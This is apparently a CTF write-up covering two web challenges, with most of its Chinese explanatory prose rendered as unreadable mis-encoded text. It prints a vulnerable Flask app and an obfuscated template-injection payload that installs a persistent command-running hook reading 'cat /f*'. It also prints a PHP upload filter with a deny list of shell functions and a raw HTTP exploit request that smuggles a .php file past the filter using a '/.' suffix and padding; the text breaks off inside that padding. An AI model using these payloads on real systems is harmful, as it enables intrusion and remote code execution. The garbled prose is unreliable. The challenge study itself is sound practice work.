class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, render_template_string, request, render_template, redirect, url_for, session, flash, g</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> rot13, key</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;your_secret_key&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;DATABASE&#x27;</span>] = <span class="string">&#x27;database.db&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_db</span>():</span><br><span class="line">    db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        db = g._database = sqlite3.connect(app.config[<span class="string">&#x27;DATABASE&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_appcontext</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close_connection</span>(<span class="params">exception</span>):</span><br><span class="line">    db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        db.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;home.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rot13&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot13_route</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        action = request.form[<span class="string">&#x27;action&#x27;</span>]</span><br><span class="line">        text = request.form[<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">            encrypted_text = rot13(text)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;rot13_result&#x27;</span>, result=encrypted_text, action=<span class="string">&#x27;encrypt&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> action == <span class="string">&#x27;decrypt&#x27;</span>:</span><br><span class="line">            text = request.form[<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line">            decrypted_text = rot13(text)</span><br><span class="line">            <span class="keyword">if</span> key(decrypted_text):</span><br><span class="line">                template = <span class="string">&#x27;&lt;h1&gt;Your decrypted text is: &#123;&#123;%s&#125;&#125;&lt;/h1&gt;&#x27;</span> % decrypted_text</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    render_template_string(template)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    abort(<span class="number">404</span>)</span><br><span class="line">                <span class="comment"># return &quot;æ—¢ç„¶ä½ æ˜¯é»‘é˜”ï¼Œé‚£æˆ‘å‡­ä»€ä¹ˆç»™ä½ å›æ˜¾&quot;</span></span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;rot13_result&#x27;</span>, result=<span class="string">&quot;æ—¢ç„¶ä½ æ˜¯é»‘é˜”ï¼Œé‚£æˆ‘å‡­ä»€ä¹ˆç»™ä½ å›æ˜¾&quot;</span>, action=<span class="string">&#x27;decrypt&#x27;</span>))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;rot13_result&#x27;</span>, result=decrypted_text, action=<span class="string">&#x27;decrypt&#x27;</span>))</span><br><span class="line">                template = <span class="string">&#x27;&lt;h1&gt;Your decrypted text is: %s&lt;/h1&gt;&#x27;</span> % decrypted_text</span><br><span class="line">                <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rot13_result/&lt;action&gt;/&lt;result&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot13_result</span>(<span class="params">action, result</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;rot13_result.html&#x27;</span>, action=action, result=result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        db = get_db()</span><br><span class="line">        cursor = db.cursor()</span><br><span class="line">        cursor.execute(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password))</span><br><span class="line">        user = cursor.fetchone()</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;message_board&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        db = get_db()</span><br><span class="line">        cursor = db.cursor()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;</span>, (username, password))</span><br><span class="line">            db.commit()</span><br><span class="line">            flash(<span class="string">&#x27;Registration successful! Please log in.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">            flash(<span class="string">&#x27;Username already exists!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/message_board&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message_board</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    db = get_db()</span><br><span class="line">    cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">        cursor.execute(<span class="string">&quot;INSERT INTO messages (username, message) VALUES (?, ?)&quot;</span>, (session[<span class="string">&#x27;username&#x27;</span>], message))</span><br><span class="line">        db.commit()</span><br><span class="line"></span><br><span class="line">    cursor.execute(<span class="string">&quot;SELECT username, message FROM messages&quot;</span>)</span><br><span class="line">    messages = cursor.fetchall()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;message_board.html&#x27;</span>, messages=messages)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/11/image-20251128165447668.png" alt="image-20251128165447668"></p><p>&#x2F;rot13è·¯ç”±å­˜åœ¨sstiï¼Œè¯•å‡ºconfigå¯ä»¥è¿›å…¥ifï¼Œè€Œä¸”æ— å›æ˜¾ï¼Œé‚£ä¹ˆå°±æ˜¯flaskä¸‹çš„å†…å­˜é©¬äº†ï¼Œå¯¹å…³é”®å­—æœ‰äº›è¿‡æ»¤ï¼Œæ‹¼æ¥å³å¯ï¼payloadï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config&#125;&#125;&#123;&#123;url<span class="built_in">_</span>for[&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;~&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;<span class="built_in">_</span><span class="built_in">_</span>buil&#x27;~&#x27;tins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;ev&#x27;&#x27;al&#x27;](&quot;app.before<span class="built_in">_</span>request<span class="built_in">_</span>funcs.setdefault(None, []).append(lambda:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read())&quot;,&#123;&#x27;app&#x27;:url<span class="built_in">_</span>for[&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;~&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;current<span class="built_in">_</span>ap&#x27;~&#x27;p&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="å¥¶é¾™ç‰ŒWAF"><a href="#å¥¶é¾™ç‰ŒWAF" class="headerlink" title="å¥¶é¾™ç‰ŒWAF"></a>å¥¶é¾™ç‰ŒWAF</h2><p>ç»™å‡ºæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$fileExtension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>, PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$fileExtension</span>, <span class="string">&#x27;ph&#x27;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$fileExtension</span>, <span class="string">&#x27;hta&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ä¸å…è®¸ä¸Šä¼ æ­¤ç±»æ–‡ä»¶ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;æ–‡ä»¶å¤§å°è¶…è¿‡é™åˆ¶ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="literal">false</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dangerous_patterns</span> = [</span><br><span class="line">            <span class="string">&#x27;/&lt;\?php/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&lt;\?=/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&lt;\?xml/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/\b(eval|base64_decode|exec|shell_exec|system|passthru|proc_open|popen|php:\/\/filter|php_value|auto_append_file|auto_prepend_file|include_path|AddType)\b/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/\b(select|insert|update|delete|drop|union|from|where|having|like|into|table|set|values)\b/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/--\s/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/\/\*\s.*\*\//&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/#/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&lt;script\b.*?&gt;.*?&lt;\/script&gt;/is&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/javascript:/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/on\w+\s*=\s*[&quot;\&#x27;].*[&quot;\&#x27;]/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/[\&lt;\&gt;\&#x27;\&quot;\\\`\;\=]/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/%[0-9a-fA-F]&#123;2&#125;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&amp;#[0-9]&#123;1,5&#125;;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&amp;#x[0-9a-fA-F]+;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/system\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/exec\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/passthru\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/shell_exec\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/file_get_contents\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/fopen\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/file_put_contents\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/%u[0-9A-F]&#123;4&#125;/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/[^\x00-\x7F]/&#x27;</span>,</span><br><span class="line">            <span class="comment">// æ£€æµ‹è·¯å¾„ç©¿è¶Š</span></span><br><span class="line">            <span class="string">&#x27;/\.\.\//&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$dangerous_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$file_content</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;å†…å®¹åŒ…å«å±é™©å­—ç¬¦ï¼Œä¸Šä¼ è¢«å¥¶é¾™æ‹¦æˆªï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$upload_dir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$upload_dir</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$new_file_name</span> = <span class="variable">$upload_dir</span> . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">print</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$new_file_name</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ä¿å­˜å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼Œé”™è¯¯ä»£ç ï¼š&quot;</span> . <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹åç¼€åå’Œæ–‡ä»¶å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œ<code>$file_content = file_get_contents($file[&#39;tmp_name&#39;], false, null, 0, 5000);</code>åªä¼šå¯¹å‰5000ä¸ªå­—ç¬¦è¿›è¡Œæ£€æµ‹ï¼Œäºæ˜¯å¯ä»¥ç”¨è„æ•°æ®ç»•è¿‡</p><p><code>move_uploaded_fileå‡½æ•°</code></p><blockquote><p>åœ¨ <code>move_upload_file()</code> å‡½æ•°ä¸­æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œåœ¨æ–‡ä»¶ç§»åŠ¨æ—¶å¦‚æœæ–‡ä»¶åå­˜åœ¨ <code>/.</code>ï¼Œé‚£ä¼šè‡ªåŠ¨å°† <code>/.</code> å»æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¯¥ç‰¹æ€§æ¥ç»•è¿‡é»‘åå•çš„æ£€æµ‹ï¼Œä»è€Œå®ç°æ–‡ä»¶ä¸Šä¼ ã€‚</p></blockquote><p>æ‰€ä»¥expï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /?name=1.php/. HTTP/1.1</span><br><span class="line">Host: challenge.imxbt.cn:31272</span><br><span class="line">Content-Length: 5215</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://challenge.imxbt.cn:31272</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFClPxPRBk7fIw7Nh</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://challenge.imxbt.cn:31272/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryFClPxPRBk7fIw7Nh</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload<span class="built_in">_</span>file&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa